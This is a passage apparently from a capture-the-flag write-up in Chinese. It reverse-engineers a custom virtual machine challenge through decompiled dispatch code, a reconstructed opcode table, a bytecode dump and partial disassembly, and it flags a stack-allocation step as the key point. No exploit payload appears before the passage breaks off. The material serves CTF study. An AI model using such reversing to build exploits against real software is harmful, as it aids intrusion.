(_QWORD *)v33[3];\n        v33[3] = v5 + 1;\n        v33[1] = *v5;\n        break;\n      case 0x53u:\n        if ( v33[3] - (_QWORD)v35 > 7679LL )\n          sub_AC0((__int64)\"stack overflow detected\");\n        v6 = (_QWORD *)v33[3];\n        v33[3] = v6 + 1;\n        v33[2] = *v6;\n        break;\n      case 0x61u:\n        v7 = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        *v33 += v7;\n        break;\n      case 0x62u:\n        v8 = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        v33[1] += v8;\n        break;\n      case 0x63u:\n        v9 = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        v33[2] += v9;\n        break;\n      case 0x64u:\n        v12 = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        *v33 -= v12;\n        break;\n      case 0x65u:\n        v13 = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        v33[1] -= v13;\n        break;\n      case 0x66u:\n        v14 = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        v33[2] -= v14;\n        break;\n      case 0x67u:\n        v15 = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        *v33 *= v15;\n        break;\n      case 0x68u:\n        v16 = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        v33[1] *= v16;\n        break;\n      case 0x69u:\n        v17 = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        v33[2] *= v17;\n        break;\n      case 0x6Au:\n        v18 = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        *v33 ^= v18;\n        break;\n      case 0x6Bu:\n        v19 = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        v33[1] ^= v19;\n        break;\n      case 0x6Cu:\n        v20 = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        v33[2] ^= v20;\n        break;\n      case 0x6Du:\n        *v33 = 0LL;\n        break;\n      case 0x6Eu:\n        v33[1] = 0LL;\n        break;\n      case 0x6Fu:\n        v33[2] = 0LL;\n        break;\n      case 0x7Eu:\n        v22 = *(signed __int16 *)v33[5];\n        v33[5] += 2LL;\n        v33[5] += v22;\n        break;\n      case 0x7Fu:\n        v33[5] = *v33;\n        break;\n      case 0x80u:\n        v33[3] += 8LL;\n        *(_QWORD *)v33[3] = v33[5];\n        v33[5] = *v33;\n        break;\n      case 0x81u:\n        v10 = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        v33[3] += 8LL * (v10 / 8);\n        break;\n      case 0x82u:\n        v11 = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        v33[3] += -8LL * (v11 / 8);\n        break;\n      case 0x88u:\n        v23 = *(signed __int16 *)v33[5];\n        v33[5] += 2LL;\n        v33[3] += 8LL;\n        *(_QWORD *)v33[3] = v33[5];\n        v33[5] += v23;\n        break;\n      case 0x8Fu:\n        v21 = *(unsigned __int8 *)v33[5]++;\n        ((void (__fastcall *)(_QWORD, _QWORD, _QWORD))*(&off_2038E0 + v21))(*v33, v33[1], v33[2]);\n        break;\n      case 0x90u:\n        v24 = (_QWORD *)v33[3];\n        v33[3] = v24 - 1;\n        v33[5] = *v24;\n        break;\n      case 0xFFu:\n        return 0LL;\n      default:\n        printf(\":%d\\n\", *v3);\n        sub_AC0((__int64)\"Illegal Instrumention\");\n        return result;\n    }\n  }\n}\n```\n\n理解程序写出指令集\n\n```c\n//模拟系统调用表\n//mov rax,rsp\n#define MOV_RAX_RSP 0x10\n//mov rax,immediate_value\n#define MOV_RAX_I 0x11\n//mov rbx,immediate_value\n#define MOV_RBX_I 0x12\n//mov rcx,immediate_value\n#define MOV_RCX_I 0x13\n//mov rax,&data_mem[x]\n#define MOV_RAX_MEM_ADDR 0x20\n//mov rax,data_mem[x]\n#define MOV_RAX_MEM 0x21\n//mov rbx,data_mem[x]\n#define MOV_RBX_MEM 0x22\n//mov rcx,data_mem[x]\n#define MOV_RCX_MEM 0x23\n//mov data_mem[x],rax\n#define MOV_MEM_RAX 0x33\n//mov data_mem[x],rbx\n#define MOV_MEM_RBX 0x34\n//mov data_mem[x],rcx\n#define MOV_MEM_RCX 0x35\n//push rax\n#define PUSH_RAX 0x44\n//push rbx\n#define PUSH_RBX 0x45\n//push rcx\n#define PUSH_RCX 0x46\n//pop rax\n#define POP_RAX 0x51\n//pop rbx\n#define POP_RBX 0x52\n//pop rcx\n#define POP_RCX 0x53\n//add rax,immdiate_value\n#define ADD_RAX_I 0x61\n//add rbx,immdiate_value\n#define ADD_RBX_I 0x62\n//add rcx,immdiate_value\n#define ADD_RCX_I 0x63\n//sub rax,immdiate_value\n#define SUB_RAX_I 0x64\n//sub rbx,immdiate_value\n#define SUB_RBX_I 0x65\n//sub rcx,immdiate_value\n#define SUB_RCX_I 0x66\n//mul rax,immdiate_value\n#define MUL_RAX_I 0x67\n//mul rbx,immdiate_value\n#define MUL_RBX_I 0x68\n//mul rcx,immdiate_value\n#define MUL_RCX_I 0x69\n//xor rax,immdiate_value\n#define XOR_RAX_I 0x6A\n//xor rbx,immdiate_value\n#define XOR_RBX_I 0x6B\n//xor rcx,immdiate_value\n#define XOR_RCX_I 0x6C\n//xor rax,rax\n#define ZERO_RAX 0x6D\n//xor rbx,rbx\n#define ZERO_RBX 0x6E\n//xor rcx,rcx\n#define ZERO_RCX 0x6F\n//syscall\n#define SYSCALL 0x8F\n//jmp $+-\n#define JMP_NEAR 0x7E\n//jmp rax\n#define JMP_RAX 0x7F\n//call rax\n#define CALL_RAX 0x80\n//call near\n#define CALL_NEAR 0x88\n//leave\n#define LEAVE 0x90\n//exit\n#define EXIT 0xFF\n//add rsp,immdiate_value\n#define ADD_RSP_I 0x81\n//sub rsp,immdiate_value\n#define SUB_RSP_I 0x82\n```\n\ndump出代码段数据：\n\n```c\n//代码段数据\nunsigned char ida_chars[] =\n{\n  0x7E, 0xA5, 0x03, 0x82, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x11, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, \n  0x23, 0x33, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x11, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x33, \n  0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x23, \n  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x33, 0x10, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x23, 0x23, 0x23, \n  0x23, 0x23, 0x23, 0x23, 0x23, 0x33, 0x18, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x11, 0x23, 0x23, 0x23, 0x23, 0x23, \n  0x23, 0x23, 0x23, 0x33, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x11, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x33, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, \n  0x52, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x13, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8F, \n  0x01, 0x11, 0x23, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, \n  0x33, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, \n  0x20, 0x20, 0x77, 0x65, 0x6C, 0x63, 0x6F, 0x6D, 0x33, 0x08, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x65, 0x20, \n  0x74, 0x6F, 0x20, 0x32, 0x30, 0x32, 0x33, 0x10, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x30, 0x20, 0x47, 0x41, \n  0x43, 0x54, 0x46, 0x20, 0x33, 0x18, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x11, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, \n  0x20, 0x23, 0x33, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x11, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x33, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0x52, \n  0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x13, \n  0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8F, 0x01, \n  0x11, 0x23, 0x20, 0x20, 0x20, 0x74, 0x68, 0x69, 0x73, 0x33, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, \n  0x69, 0x73, 0x20, 0x61, 0x20, 0x6D, 0x65, 0x33, 0x08, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x73, 0x73, 0x61, \n  0x67, 0x65, 0x20, 0x66, 0x72, 0x33, 0x10, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x11, 0x6F, 0x6D, 0x20, 0x76, 0x6D, \n  0x20, 0x6D, 0x61, 0x33, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x11, 0x63, 0x68, 0x69, 0x6E, 0x65, 0x20, 0x20, \n  0x23, 0x33, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x11, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x33, \n  0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0x52, 0x11, \n  0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x13, 0x29, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8F, 0x01, 0x11, \n  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x33, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x23, 0x23, \n  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x33, 0x08, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x23, 0x23, 0x23, 0x23, \n  0x23, 0x23, 0x23, 0x23, 0x33, 0x10, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x11, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, \n  0x23, 0x23, 0x33, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x11, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, \n  0x33, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, \n  0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x33, 0x28, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0x52, 0x11, 0x01, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x13, 0x29, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8F, 0x01, 0x11, 0x23, \n  0x74, 0x65, 0x6C, 0x6C, 0x20, 0x6D, 0x65, 0x33, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x77, 0x68, \n  0x61, 0x74, 0x20, 0x69, 0x73, 0x33, 0x08, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x79, 0x6F, 0x75, 0x72, \n  0x20, 0x6E, 0x61, 0x33, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x11, 0x6D, 0x65, 0x3A, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x33, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, \n  0x52, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x13, 0x1B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8F, \n  0x01, 0x10, 0x44, 0x52, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x13, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x8F, 0x00, 0x10, 0x8F, 0x02, 0x11, 0x6F, 0x6B, \n  0x2C, 0x77, 0x68, 0x61, 0x74, 0x20, 0x33, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x64, 0x6F, 0x20, 0x79, \n  0x6F, 0x75, 0x20, 0x77, 0x33, 0x08, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x11, 0x61, 0x6E, 0x74, 0x20, 0x74, 0x6F, \n  0x20, 0x73, 0x33, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x11, 0x61, 0x79, 0x3A, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x33, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0x52, \n  0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x13, \n  0x1B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8F, 0x01, \n  0x10, 0x44, 0x52, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x13, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x8F, 0x00, 0x11, 0x4E, 0x6F, 0x77, 0x2C, 0x49, 0x20, \n  0x72, 0x65, 0x33, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x11, 0x63, 0x65, 0x76, 0x69, 0x65, 0x20, 0x79, 0x6F, \n  0x33, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, \n  0x75, 0x72, 0x20, 0x6D, 0x65, 0x73, 0x73, 0x61, 0x33, 0x10, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x67, 0x65, \n  0x2C, 0x62, 0x79, 0x65, 0x7E, 0x0A, 0x33, 0x18, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x44, 0x52, 0x11, 0x01, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x13, 0x20, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x8F, 0x01, 0x81, 0x00, 0x01, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0x11, 0x20, 0x5F, 0x5F, \n  0x5F, 0x5F, 0x5F, 0x20, 0x20, 0x33, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x20, 0x20, 0x20, 0x20, \n  0x5F, 0x5F, 0x5F, 0x33, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x11, 0x20, 0x20, 0x20, 0x5F, 0x5F, 0x5F, 0x5F, \n  0x5F, 0x33, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x11, 0x20, 0x20, 0x20, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x33, \n  0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, \n  0x20, 0x20, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x33, 0x20, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x20, 0x20, \n  0x20, 0x20, 0x20, 0x20, 0x20, 0x33, 0x28, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x11, 0x5F, 0x20, 0x20, 0x20, 0x20, \n  0x20, 0x5F, 0x20, 0x33, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x11, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x5F, \n  0x5F, 0x33, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x11, 0x5F, 0x20, 0x20, 0x5F, 0x5F, 0x5F, 0x0A, 0x00, 0x33, \n  0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0x52, 0x11, \n  0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x13, 0x47, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8F, 0x01, 0x11, \n  0x2F, 0x20, 0x20, 0x5F, 0x5F, 0x5F, 0x7C, 0x20, 0x33, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x20, \n  0x20, 0x20, 0x2F, 0x20, 0x20, 0x20, 0x33, 0x08, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x7C, 0x20, 0x2F, 0x20, \n  0x20, 0x5F, 0x5F, 0x5F, 0x33, 0x10, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x11, 0x7C, 0x20, 0x7C, 0x5F, 0x20, 0x20, \n  0x20, 0x5F, 0x33, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x11, 0x7C, 0x20, 0x7C, 0x20, 0x20, 0x5F, 0x5F, 0x5F, \n  0x33, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, \n  0x7C, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7C, 0x33, 0x28, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x7C, \n  0x20, 0x20, 0x20, 0x2F, 0x20, 0x2F, 0x33, 0x30, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x20, 0x20, 0x20, \n  0x20, 0x2F, 0x20, 0x20, 0x33, 0x38, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x11, 0x20, 0x7C, 0x2F, 0x20, 0x20, 0x20, \n  0x7C, 0x0A, 0x33, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x44, 0x52, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x13, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x8F, 0x01, 0x11, 0x7C, 0x20, 0x7C, 0x20, 0x20, 0x20, 0x20, \n  0x20, 0x33, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x11, 0x20, 0x20, 0x20, 0x2F, 0x20, 0x2F, 0x7C, 0x20, 0x33, \n  0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x7C, \n  0x20, 0x7C, 0x20, 0x7C, 0x20, 0x20, 0x20, 0x33, 0x10, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x20, 0x20, \n  0x20, 0x7C, 0x20, 0x7C, 0x20, 0x33, 0x18, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x20, 0x7C, 0x20, 0x7C, \n  0x5F, 0x5F, 0x20, 0x33, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x11, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, \n  0x7C, 0x33, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x11, 0x20, 0x7C, 0x20, 0x20, 0x2F, 0x20, 0x2F, 0x20, 0x33, \n  0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, \n  0x20, 0x20, 0x20, 0x2F, 0x20, 0x2F, 0x7C, 0x33, 0x38, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x20, 0x20, \n  0x2F, 0x7C, 0x20, 0x7C, 0x0A, 0x33, 0x40, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x44, 0x52, 0x11, 0x01, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x13, 0x48, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x8F, 0x01, 0x11, 0x7C, 0x20, 0x7C, 0x20, \n  0x20, 0x5F, 0x20, 0x20, 0x33, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x11, 0x20, 0x20, 0x2F, 0x20, 0x2F, 0x20, \n  0x7C, 0x20, 0x33, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x11, 0x7C, 0x20, 0x7C, 0x20, 0x7C, 0x20, 0x20, 0x20, \n  0x33, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, \n  0x20, 0x20, 0x20, 0x20, 0x7C, 0x20, 0x7C, 0x20, 0x33, 0x18, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x20, \n  0x7C, 0x20, 0x20, 0x5F, 0x5F, 0x7C, 0x33, 0x20, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x20, 0x20, 0x20, \n  0x20, 0x20, 0x20, 0x7C, 0x33, 0x28, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x11, 0x20, 0x7C, 0x20, 0x2F, 0x20, 0x2F, \n  0x20, 0x20, 0x33, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x11, 0x20, 0x20, 0x20, 0x2F, 0x20, 0x2F, 0x20, 0x7C, \n  0x33, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, \n  0x5F, 0x5F, 0x2F, 0x20, 0x7C, 0x20, 0x7C, 0x0A, 0x33, 0x40, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0x52, 0x11, 0x01, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x13, 0x48, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8F, 0x01, 0x11, 0x7C, \n  0x20, 0x7C, 0x5F, 0x7C, 0x20, 0x7C, 0x20, 0x33, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x2F, 0x20, \n  0x2F, 0x20, 0x20, 0x7C, 0x20, 0x33, 0x08, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x11, 0x7C, 0x20, 0x7C, 0x20, 0x7C, \n  0x5F, 0x5F, 0x5F, 0x33, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x11, 0x20, 0x20, 0x20, 0x20, 0x7C, 0x20, 0x7C, \n  0x20, 0x33, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x11, 0x20, 0x20, 0x7C, 0x20, 0x7C, 0x20, 0x20, 0x20, 0x33, \n  0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, \n  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7C, 0x33, 0x28, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x7C, 0x2F, \n  0x20, 0x2F, 0x20, 0x20, 0x20, 0x33, 0x30, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x20, 0x2F, 0x20, 0x2F, \n  0x20, 0x20, 0x20, 0x33, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x11, 0x20, 0x20, 0x20, 0x20, 0x7C, 0x20, 0x7C, \n  0x0A, 0x33, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, \n  0x52, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x13, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8F, \n  0x01, 0x11, 0x5C, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x2F, 0x20, \n  0x33, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, \n  0x2F, 0x5F, 0x2F, 0x20, 0x20, 0x20, 0x7C, 0x5F, 0x33, 0x08, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x7C, 0x20, \n  0x5C, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x33, 0x10, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x7C, 0x20, 0x20, 0x20, \n  0x7C, 0x5F, 0x7C, 0x20, 0x33, 0x18, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x11, 0x20, 0x20, 0x7C, 0x5F, 0x7C, 0x20, \n  0x20, 0x20, 0x33, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x11, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7C, \n  0x33, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, \n  0x5F, 0x5F, 0x5F, 0x2F, 0x20, 0x20, 0x20, 0x20, 0x33, 0x30, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x2F, \n  0x5F, 0x2F, 0x20, 0x20, 0x20, 0x20, 0x33, 0x38, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x20, 0x20, 0x20, 0x20, \n  0x7C, 0x5F, 0x7C, 0x0A, 0x33, 0x40, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x44, 0x52, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x13, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, \n  0x00, 0x00, 0x8F, 0x01, 0x88, 0xD2, 0xF7, 0xFF, 0x00, 0x00, \n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00\n};\n```\n\n接下来该写出汇编逻辑了\n\n```c\njmp 0x3a5\nsub rsp，0x100 //关键点\nmov a0, 0x2323232323232323\nmov [buf+0x0],a0\nmov a0, 0x2323232323232323\nmov [buf+0x8],a0\nmov a0, 0x2323232323232323\nmov [buf+0x10],a0\nmov a0, 0x2323232323232323\nmov [buf+0x18],a0\nmov a0, 0x2323232323232323\nmov [buf+0x20],a0\nmov a0,0xa\nmov [buf+0x28],a0\nmov a0,[buf+0x0]\npush a0\npop a1\nmov a0,1\nmov a2, 0x29\nsyscall 1 //write\nmov a0, 0x2020202020202023\nmov [buf+0x0],a0\nmov a0, 0x6d6f636c65772020\nmov [buf+0x8],a0\nmov a0, 0x323032206f742065\nmov [buf+0x10],a0\nmov a0, 0x2046544341472030\nmov [buf+0x18],a0\nmov a0, 0x2320202020202020\nmov [buf+0x20],a0\nmov a0, 0xa\nmov [buf+0x28],a0\nlea a0,[buf+0x0]\npush a0\npop a1\nmov a0, 0x1\nmov a2, 0x29\nsyscall 1 //write\nmov a0, 0x7369687420202023\nmov [buf+0x0],a0\nmov a0, 0x656d206120736920\nmov [buf+0x8],a0\nmov a0, 0x7266206567617373\nmov [buf+0x10],a0\nmov a0, 0x616d206d76206d6f\nmov [buf+0x18],a0\nmov a0, 0x232020656e696863\nmov [buf+0x20],a0\nmov a0, 0xa\nmov [buf+0x28],a0\nlea a0,[buf+0x0]\npush a0\npop a1\nmov a0, 0x1\nmov a2, 0x29\nsyscall 1 //write\nmov a0, 0x2323232323232323\nmov [buf+0x0],a0\nmov a0, 0x2323232323232323\nmov [buf+0x8],a0\nmov a0, 0x2323232323232323\nmov [buf+0x10],a0\nmov a0, 